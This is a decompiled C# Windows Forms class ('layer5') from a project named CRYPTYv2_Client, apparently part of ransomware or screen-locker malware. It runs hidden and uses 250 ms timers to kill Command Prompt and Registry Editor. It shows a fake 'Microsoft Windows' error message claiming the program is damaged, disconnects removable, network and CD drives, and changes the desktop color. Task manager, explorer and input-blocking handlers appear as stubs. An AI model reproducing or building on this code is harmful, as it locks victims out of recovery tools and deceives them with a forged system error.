using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using CRYPTYv2_Client.My;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace CRYPTYv2_Client;

[DesignerGenerated]
public class layer5 : Form
{
	private IContainer components;

	private long DisconnectIt;

	internal virtual Timer disableCMD
	{
		[CompilerGenerated]
		get
		{
			return _disableCMD;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = disableCMD_Tick;
			Timer val = _disableCMD;
			if (val != null)
			{
				val.remove_Tick(eventHandler);
			}
			_disableCMD = value;
			val = _disableCMD;
			if (val != null)
			{
				val.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer disableTASKMGR
	{
		[CompilerGenerated]
		get
		{
			return _disableTASKMGR;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = disableTASKMGR_Tick;
			Timer val = _disableTASKMGR;
			if (val != null)
			{
				val.remove_Tick(eventHandler);
			}
			_disableTASKMGR = value;
			val = _disableTASKMGR;
			if (val != null)
			{
				val.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer disableREGEDIT
	{
		[CompilerGenerated]
		get
		{
			return _disableREGEDIT;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = disableREGEDIT_Tick;
			Timer val = _disableREGEDIT;
			if (val != null)
			{
				val.remove_Tick(eventHandler);
			}
			_disableREGEDIT = value;
			val = _disableREGEDIT;
			if (val != null)
			{
				val.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer disableINPUT
	{
		[CompilerGenerated]
		get
		{
			return _disableINPUT;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = disableINPUT_Tick;
			Timer val = _disableINPUT;
			if (val != null)
			{
				val.remove_Tick(eventHandler);
			}
			_disableINPUT = value;
			val = _disableINPUT;
			if (val != null)
			{
				val.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer disableExplorer
	{
		[CompilerGenerated]
		get
		{
			return _disableExplorer;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = disableExplorer_Tick;
			Timer val = _disableExplorer;
			if (val != null)
			{
				val.remove_Tick(eventHandler);
			}
			_disableExplorer = value;
			val = _disableExplorer;
			if (val != null)
			{
				val.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer disconnectDevices
	{
		[CompilerGenerated]
		get
		{
			return _disconnectDevices;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = disconnectDevices_Tick;
			Timer val = _disconnectDevices;
			if (val != null)
			{
				val.remove_Tick(eventHandler);
			}
			_disconnectDevices = value;
			val = _disconnectDevices;
			if (val != null)
			{
				val.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer changeWallpaper
	{
		[CompilerGenerated]
		get
		{
			return _changeWallpaper;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = changeWallpaper_Tick;
			Timer val = _changeWallpaper;
			if (val != null)
			{
				val.remove_Tick(eventHandler);
			}
			_changeWallpaper = value;
			val = _changeWallpaper;
			if (val != null)
			{
				val.add_Tick(eventHandler);
			}
		}
	}

	public layer5()
	{
		((Form)this).add_Load((EventHandler)layer5_Load);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		//IL_0023: Unknown result type (might be due to invalid IL or missing references)
		//IL_002d: Expected O, but got Unknown
		//IL_0034: Unknown result type (might be due to invalid IL or missing references)
		//IL_003e: Expected O, but got Unknown
		//IL_0045: Unknown result type (might be due to invalid IL or missing references)
		//IL_004f: Expected O, but got Unknown
		//IL_0056: Unknown result type (might be due to invalid IL or missing references)
		//IL_0060: Expected O, but got Unknown
		//IL_0067: Unknown result type (might be due to invalid IL or missing references)
		//IL_0071: Expected O, but got Unknown
		//IL_0078: Unknown result type (might be due to invalid IL or missing references)
		//IL_0082: Expected O, but got Unknown
		components = new Container();
		disableCMD = new Timer(components);
		disableTASKMGR = new Timer(components);
		disableREGEDIT = new Timer(components);
		disableINPUT = new Timer(components);
		disableExplorer = new Timer(components);
		disconnectDevices = new Timer(components);
		changeWallpaper = new Timer(components);
		((Control)this).SuspendLayout();
		disableCMD.set_Enabled(true);
		disableCMD.set_Interval(250);
		disableTASKMGR.set_Enabled(true);
		disableTASKMGR.set_Interval(250);
		disableREGEDIT.set_Enabled(true);
		disableREGEDIT.set_Interval(250);
		disableINPUT.set_Enabled(true);
		disableINPUT.set_Interval(250);
		disableExplorer.set_Enabled(true);
		disableExplorer.set_Interval(250);
		disconnectDevices.set_Enabled(true);
		disconnectDevices.set_Interval(250);
		changeWallpaper.set_Enabled(true);
		changeWallpaper.set_Interval(250);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(10, 10));
		((Form)this).set_ControlBox(false);
		((Control)this).set_Enabled(false);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("layer5");
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_Text("L5");
		((Form)this).set_WindowState((FormWindowState)1);
		((Control)this).ResumeLayout(false);
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern long BlockInput(long fBlock);

	[DllImport("mpr.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern long WNetCancelConnectionA([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszName, long bForce);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern bool SetSysColors(int one, ref int element, ref int color);

	private void layer5_Load(object sender, EventArgs e)
	{
		((Control)MyProject.Forms.layer6).Show();
	}

	public object showErrorMessage()
	{
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		((Form)this).set_TopMost(true);
		object obj = "This program has been damaged, possibly by a software bug.";
		object obj2 = 16;
		object obj3 = "Microsoft Windows";
		_ = (object)Interaction.MsgBox(RuntimeHelpers.GetObjectValue(obj), (MsgBoxStyle)Conversions.ToInteger(obj2), RuntimeHelpers.GetObjectValue(obj3));
		((Form)this).set_TopMost(false);
		return "";
	}

	private void disableCMD_Tick(object sender, EventArgs e)
	{
		try
		{
			Process[] processesByName = Process.GetProcessesByName("cmd");
			foreach (Process process in processesByName)
			{
				process.Kill();
				showErrorMessage();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void disableTASKMGR_Tick(object sender, EventArgs e)
	{
		try
		{
			Process[] processesByName = Process.GetProcessesByName("taskmgr");
			for (int i = 0; i < processesByName.Length; i = checked(i + 1))
			{
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void disableREGEDIT_Tick(object sender, EventArgs e)
	{
		try
		{
			Process[] processesByName = Process.GetProcessesByName("regedit");
			foreach (Process process in processesByName)
			{
				process.Kill();
				showErrorMessage();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void disableExplorer_Tick(object sender, EventArgs e)
	{
		try
		{
			Process[] processesByName = Process.GetProcessesByName("explorer");
			for (int i = 0; i < processesByName.Length; i = checked(i + 1))
			{
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void disableINPUT_Tick(object sender, EventArgs e)
	{
	}

	private void disconnectDevices_Tick(object sender, EventArgs e)
	{
		try
		{
			DriveInfo[] drives = DriveInfo.GetDrives();
			foreach (DriveInfo driveInfo in drives)
			{
				try
				{
					if ((driveInfo.DriveType == DriveType.CDRom) | (driveInfo.DriveType == DriveType.Network) | (driveInfo.DriveType == DriveType.Removable))
					{
						DriveInfo driveInfo2;
						string lpszName = (driveInfo2 = driveInfo).VolumeLabel;
						long disconnectIt = WNetCancelConnectionA(ref lpszName, -1L);
						driveInfo2.VolumeLabel = lpszName;
						DisconnectIt = disconnectIt;
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void changeWallpaper_Tick(object sender, EventArgs e)
	{
		int color = ColorTranslator.ToWin32(Color.DarkBlue);
		int element = 1;
		SetSysColors(1, ref element, ref color);
	}
}
